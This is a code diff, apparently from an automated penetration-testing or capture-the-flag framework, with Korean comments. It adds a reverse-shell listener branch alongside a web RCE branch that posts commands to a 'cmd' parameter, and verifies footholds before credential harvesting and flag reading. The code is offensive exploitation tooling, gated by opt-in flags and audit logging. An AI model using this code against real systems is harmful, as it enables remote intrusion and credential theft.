@@ -111,7 +111,7 @@ class FootholdMixin:
         """발판 세션 확보 → 자격수확 → 플래그 수집. --exploit-exec 전용(RCE 실행 표면)."""
         if not self.exploit_exec or self.world is None or self.dry_run:
             return
-        session = self._acquire_session(report, host)   # ← 발판 획득(아래 TODO)
+        session = self._acquire_session(report, host)   # ← 발판 획득(웹 RCE → 리버스셸 수신)
         if session is None or not session.alive:
             return
         from . import cred_sources, flag_read
@@ -131,12 +131,22 @@ class FootholdMixin:
 
     def _acquire_session(self, report, host):
         """발판 세션 획득 + 성립 검증. --exploit-exec/--auto-poc 전용(RCE 실행 표면).
-        현재는 웹 RCE 분기만 활성 — 역쉘 수신 경로는 순서 4(실제 경로 확인) 후 재추가.
-        웹 RCE 채널 전송부(shell_transport)는 requests 에 의존(선택 설치) — 미설치면 전체
-        실행을 크래시내지 않고 '발판 미확보'로 안전하게 건너뛴다(정직한 degrade)."""
-        if self.world is None or not (self.world.web_product and self.auto_poc):
+        (1) 웹 RCE 분기(www-data 코드실행) → 실패 시 (2) 리버스셸 수신 분기(준비된 payload 콜백).
+        전송부(shell_transport)는 requests 에 의존(선택) — 미설치면 크래시 대신 '발판 미확보'로
+        안전 degrade. 리버스셸 수신(소켓)은 opt-in(`catch_revshell`)이라 기본 흐름을 막지 않는다."""
+        if self.world is None or not self.auto_poc:
             return None
         from .session_verify import looks_like_shell, verify_probe_command
+        # (1) 웹 RCE 분기 — web_product 가 식별된 경우에만
+        if self.world.web_product:
+            ws = self._acquire_web_rce(report, looks_like_shell, verify_probe_command)
+            if ws is not None:
+                return ws
+        # (2) 리버스셸 수신 분기 — opt-in(catch_revshell) + 준비된 revshell(lhost/lport) 있을 때
+        return self._acquire_reverse_shell(report, looks_like_shell, verify_probe_command)
+
+    def _acquire_web_rce(self, report, looks_like_shell, verify_probe_command):
+        """웹 RCE 발판: PoC 가 성립시킨 cmd 엔드포인트에 명령 실행 → id/uname 신호로 성립 검증."""
         from .shell_session import WebRceSession
         try:
             from .shell_transport import web_http_fn  # requests 의존(선택)
@@ -147,12 +157,48 @@ class FootholdMixin:
                 "`pip install requests`(또는 `pip install -e \".[exploit]\"`). 미설치 상태에선 "
                 "발판 미확보로 안전하게 건너뜀(실행 크래시 아님).")
             return None
-        # (1) 웹 RCE 분기: cmd 엔드포인트에 명령 실행 → id/uname 신호로 성립 검증
-        # PoC 가 성립시킨 cmd 엔드포인트(없으면 기본 config.php) — ②에서 정교화
         url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
         ws = WebRceSession(url, "cmd", method="POST", inject="body")
         ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
         # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지)
         if looks_like_shell(ws.run(verify_probe_command())):
             return ws
+        return None
+
+    def _acquire_reverse_shell(self, report, looks_like_shell, verify_probe_command):
+        """리버스셸 수신 발판: 준비된 payload(revshell_lhost/lport)로 리스너를 띄워 콜백을 받는다.
+        opt-in(`catch_revshell`) 이며, 실제 소켓 accept/recv 는 주입 가능한 catcher 가 담당한다
+        (기본: shell_transport.catch_reverse_shell — RCE 실행 표면). 켜지지 않았거나 준비된
+        revshell 컨텍스트가 없으면 조용히 생략(소켓 블로킹 없음). 콜백이 와도 성립 검증을 통과해야
+        세션으로 인정한다(거짓 발판 방지)."""
+        if not getattr(self, "catch_revshell", False):
+            return None
+        lhost = getattr(report, "revshell_lhost", "") or ""
+        lport = getattr(report, "revshell_lport", 0) or getattr(self, "revshell_port", 0)
+        if not lhost or not lport:
+            report.manual_suggestions.append(
+                "# 리버스셸 수신 비활성 — 공격자 IP/포트(revshell) 미확보. 공격자 IP 가 잡히면 "
+                "payload 가 자동 준비되고, --catch-revshell 로 리스너 수신을 켤 수 있다.")
+            return None
+        catch = getattr(self, "_revshell_catcher", None)   # 테스트 주입용(기본은 실제 소켓)
+        if catch is None:
+            try:
+                from .shell_transport import catch_reverse_shell as catch
+            except ImportError as e:   # socket 은 표준이나 모듈 상단 선택 의존 등으로 실패 시
+                self.audit.event("foothold_skip", reason="revshell_transport_unavailable",
+                                 detail=str(e))
+                return None
+        self.audit.event("revshell_listen", lhost=lhost, lport=int(lport))
+        try:
+            session = catch(lhost, int(lport))   # 소켓 accept(블로킹·타임아웃) — RCE 실행 표면
+        except OSError as e:                      # bind 실패·타임아웃·콜백 없음 → 발판 미확보
+            self.audit.event("revshell_catch_error", error=f"{type(e).__name__}: {e}")
+            return None
+        if session is None:
+            return None
+        # ★ 성립 검증: 콜백이 와도 실제 셸 신호(uid=/uname)가 없으면 폐기(거짓 발판 방지)
+        if session.alive and looks_like_shell(session.run(verify_probe_command())):
+            self.audit.event("revshell_foothold", lhost=lhost, lport=int(lport))
+            return session
+        session.close()
         return None
